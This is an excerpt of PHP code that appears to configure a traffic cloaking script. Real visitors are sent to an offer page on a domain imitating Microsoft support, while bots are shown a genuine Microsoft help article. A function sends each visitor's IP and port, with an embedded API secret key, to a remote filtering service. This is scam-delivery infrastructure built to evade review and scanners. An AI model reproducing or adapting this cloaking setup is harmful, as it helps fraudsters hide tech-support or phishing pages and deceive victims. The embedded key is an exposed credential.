...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://supportmicroteam.com/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://support.microsoft.com/en-us/office/create-an-email-message-in-outlook-147208af-ca8e-4cdf-b71f-77ba81a54069';//PHP/HTML file or URL used for bots
...
$HCSET['API_SECRET_KEY'] = 'v142ffe9aa338f4d06a804d9fd6bfbce0c';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-284466247&js=false&stage='.$HCSET['stage'];
